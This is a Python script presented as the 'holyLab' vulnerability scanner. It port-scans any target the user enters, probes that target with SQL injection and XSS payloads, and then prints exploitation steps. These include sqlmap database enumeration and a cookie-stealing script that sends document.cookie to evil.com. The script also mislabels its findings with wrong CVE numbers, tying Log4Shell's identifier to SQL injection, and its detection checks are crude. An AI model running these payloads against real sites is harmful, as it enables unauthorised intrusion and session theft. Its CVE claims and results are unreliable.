import socket
import requests
import threading
import os

# Banner
def print_banner():
    print(r'''
██╗  ██╗ ██████╗ ██╗  ██╗   ██╗██╗      █████╗ ██████╗ 
██║  ██║██╔═══██╗██║  ╚██╗ ██╔╝██║     ██╔══██╗██╔══██╗
███████║██║   ██║██║   ╚████╔╝ ██║     ███████║██████╔╝
██╔══██║██║   ██║██║    ╚██╔╝  ██║     ██╔══██║██╔══██╗
██║  ██║╚██████╔╝███████╗██║   ███████╗██║  ██║██████╔╝
╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝   ╚══════╝╚═╝  ╚═╝╚═════╝ 
                                                                                              
             github.com/el-the-coder         
           instagram.com/h0lys41nt
    ''')

# Scan for open ports
def scan_ports(target):
    open_ports = []
    common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 8080]
    print("\n[*] Scanning common ports...")
    for port in common_ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        if result == 0:
            print(f"[+] Port {port} is open")
            open_ports.append(port)
        sock.close()
    return open_ports

# SQL Injection vulnerability checker
def check_sql_injection(target):
    sql_payload = "' OR 1=1 -- "
    vulnerable = False
    try:
        response = requests.get(f"{target}/?id={sql_payload}")
        if "SQL" in response.text or "syntax" in response.text:
            print("[+] SQL Injection Vulnerability Found!")
            print("    CVE-2021-44228: SQL Injection")
            vulnerable = True
    except:
        print("[-] Could not check for SQL Injection.")
    return vulnerable

# XSS vulnerability checker
def check_xss(target):
    xss_payload = "<script>alert('XSS')</script>"
    vulnerable = False
    try:
        response = requests.get(f"{target}/?q={xss_payload}")
        if xss_payload in response.text:
            print("[+] XSS Vulnerability Found!")
            print("    CVE-2019-11043: XSS Vulnerability")
            vulnerable = True
    except:
        print("[-] Could not check for XSS.")
    return vulnerable

# Exploit SQL Injection vulnerability
def exploit_sql_injection(target):
    print("\n[*] Exploiting SQL Injection...")
    print("[+] To exploit SQL Injection manually, use the following techniques:")
    print("1. Union-based SQL Injection:\n")
    print(f"    http://{target}/?id=1 UNION SELECT 1,2,3 -- \n")
    print("2. Error-based SQL Injection:\n")
    print(f"    http://{target}/?id=1' AND 1=CONVERT(int,(SELECT @@version))-- \n")
    print("3. Automated Tool (SQLMap):\n")
    print(f"    sqlmap -u \"http://{target}/?id=1\" --dbs \n")
    print("[!] Make sure to further enumerate the database and extract data.")

# Exploit XSS vulnerability
def exploit_xss(target):
    print("\n[*] Exploiting XSS...")
    print("[+] To exploit Cross-Site Scripting (XSS), inject the following payloads:")
    print("1. Steal Cookies using a malicious script:\n")
    print(f"    http://{target}/?q=<script>document.location='http://evil.com/cookie?c='+document.cookie</script>\n")
    print("2. Display a pop-up:\n")
    print(f"    http://{target}/?q=<script>alert('Exploited by h0lys41nt!')</script>\n")
    print("3. Phishing attack or defacing the website via stored XSS.")

# Main scanner function
def vulnerability_scanner():
    print_banner()
    
    target = input("\n[*] Enter the target website IP/Domain: ")
    
    # Check if valid domain/IP
    try:
        socket.gethostbyname(target)
        print(f"[*] Target {target} is valid.")
    except socket.gaierror:
        print("[-] Invalid domain/IP. Exiting.")
        return
    
    # Scan ports
    open_ports = scan_ports(target)
    
    # Check for SQL Injection vulnerability
    sql_vuln = check_sql_injection(f"http://{target}")
    
    # Check for XSS vulnerability
    xss_vuln = check_xss(f"http://{target}")
    
    # Ask user if they want to exploit the vulnerability
    if sql_vuln:
        exploit_sql = input("\n[?] SQL Injection vulnerability found. Do you want to exploit it? (y/n): ").lower()
        if exploit_sql == 'y':
            exploit_sql_injection(target)
    
    if xss_vuln:
        exploit_xss_input = input("\n[?] XSS vulnerability found. Do you want to exploit it? (y/n): ").lower()
        if exploit_xss_input == 'y':
            exploit_xss(target)
    
    # Ask user if they want to save results
    save_file = input("\n[?] Do you want to save the scan results to a .txt file? (y/n): ").lower()
    
    if save_file == 'y':
        filename = f"scan_results_{target.replace('.', '_')}.txt"
        with open(filename, 'w') as f:
            f.write("holyLab Vulnerability Scanner Results\n")
            f.write(f"Target: {target}\n\n")
            f.write("Open Ports:\n")
            for port in open_ports:
                f.write(f"Port {port} is open\n")
            f.write("\nVulnerabilities Found:\n")
            if sql_vuln:
                f.write("[+] SQL Injection Vulnerability Found\n")
                f.write("    CVE-2021-44228: SQL Injection\n")
            if xss_vuln:
                f.write("[+] XSS Vulnerability Found\n")
                f.write("    CVE-2019-11043: XSS Vulnerability\n")
            if not sql_vuln and not xss_vuln:
                f.write("No critical vulnerabilities found.\n")
        print(f"\n[+] Results saved to {filename}")
    else:
        print("\n[+] Scan complete. Results not saved.")

if __name__ == "__main__":
    vulnerability_scanner()
